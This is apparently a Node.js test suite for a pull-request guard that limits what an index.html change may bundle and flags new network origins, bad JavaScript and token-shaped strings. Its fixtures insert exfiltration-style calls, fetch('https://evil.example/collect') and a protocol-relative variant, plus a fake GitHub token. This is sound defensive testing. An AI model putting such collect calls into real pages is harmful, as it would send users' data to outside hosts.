import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execFileSync, spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import test from "node:test";

const here = path.dirname(fileURLToPath(import.meta.url));
const guard = path.join(here, "ui-pr-guard.mjs");
const origins = path.join(here, "..", "security", "allowed-origins.txt");
const baseline = path.join(here, "..", "security", "ui-risk-baseline.json");

const safeHtml = message => `<!doctype html>
<html><body><p>${message}</p><script>
const api = "https://api.github.com";
fetch(api);
</script></body></html>\n`;

const git = (cwd, args) => execFileSync("git", args, {
  cwd,
  encoding: "utf8",
  stdio: ["ignore", "pipe", "pipe"]
});

const makeCase = mutate => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), "ui-pr-guard-test-"));
  git(cwd, ["init", "--quiet"]);
  git(cwd, ["config", "user.name", "Guard Test"]);
  git(cwd, ["config", "user.email", "guard@example.invalid"]);
  fs.writeFileSync(path.join(cwd, "index.html"), safeHtml("before"));
  git(cwd, ["add", "index.html"]);
  git(cwd, ["commit", "--quiet", "-m", "base"]);
  mutate(cwd);
  git(cwd, ["add", "-A"]);
  git(cwd, ["commit", "--quiet", "-m", "head"]);
  return cwd;
};

const run = cwd => spawnSync(process.execPath, [guard, "HEAD~1", "HEAD", origins, baseline], {
  cwd,
  encoding: "utf8"
});

test("allows a small, syntax-valid UI-only change", () => {
  const cwd = makeCase(dir => fs.writeFileSync(path.join(dir, "index.html"), safeHtml("after")));
  const result = run(cwd);
  assert.equal(result.status, 0, result.stderr);
});

test("passes a non-UI PR without applying the UI allowlist", () => {
  const cwd = makeCase(dir => fs.writeFileSync(path.join(dir, "README.md"), "documentation only\n"));
  const result = run(cwd);
  assert.equal(result.status, 0, result.stderr);
});

test("allows the page together with the scripts and documentation it embeds or describes", () => {
  const cwd = makeCase(dir => {
    fs.writeFileSync(path.join(dir, "index.html"), safeHtml("after"));
    fs.mkdirSync(path.join(dir, "scripts"));fs.mkdirSync(path.join(dir, "docs"));
    fs.writeFileSync(path.join(dir, "scripts", "core.mjs"), "export const core = 1;\n");
    fs.writeFileSync(path.join(dir, "docs", "note.md"), "note\n");
  });
  const result = run(cwd);
  assert.equal(result.status, 0, result.stderr);
});

test("still rejects the page bundled with policy or workflow files", () => {
  for (const file of ["security/ui-risk-baseline.json", ".github/workflows/x.yml", "data.json"]) {
    const cwd = makeCase(dir => {
      fs.writeFileSync(path.join(dir, "index.html"), safeHtml("after"));
      fs.mkdirSync(path.dirname(path.join(dir, file)), { recursive: true });
      fs.writeFileSync(path.join(dir, file), "{}\n");
    });
    const result = run(cwd);
    assert.notEqual(result.status, 0, file);
    assert.match(result.stderr, /may also change scripts\/ and docs\/ only/);
  }
});

test("rejects an index.html change bundled with another file", () => {
  const cwd = makeCase(dir => {
    fs.writeFileSync(path.join(dir, "index.html"), safeHtml("after"));
    fs.writeFileSync(path.join(dir, "README.md"), "smuggled change\n");
  });
  const result = run(cwd);
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /may also change scripts\/ and docs\/ only/);
});

test("rejects a new outbound origin", () => {
  const cwd = makeCase(dir => fs.writeFileSync(path.join(dir, "index.html"),
    safeHtml("after").replace("fetch(api);", 'fetch(api); fetch("https://evil.example/collect");')));
  const result = run(cwd);
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /unapproved literal network origin/);
});

test("rejects a protocol-relative outbound origin", () => {
  const cwd = makeCase(dir => fs.writeFileSync(path.join(dir, "index.html"),
    safeHtml("after").replace("fetch(api);", 'fetch("//evil.example/collect");')));
  const result = run(cwd);
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /unapproved literal network origin/);
});

test("rejects invalid inline JavaScript", () => {
  const cwd = makeCase(dir => fs.writeFileSync(path.join(dir, "index.html"),
    safeHtml("after").replace("fetch(api);", "const = ;")));
  const result = run(cwd);
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /invalid JavaScript syntax/);
});

test("rejects a provider-shaped credential only when newly added", () => {
  const cwd = makeCase(dir => fs.writeFileSync(path.join(dir, "index.html"),
    safeHtml("after").replace("fetch(api);", 'fetch(api); const accidental = "github_pat_1234567890abcdefghij";')));
  const result = run(cwd);
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /suspected GitHub fine-grained token/);
});
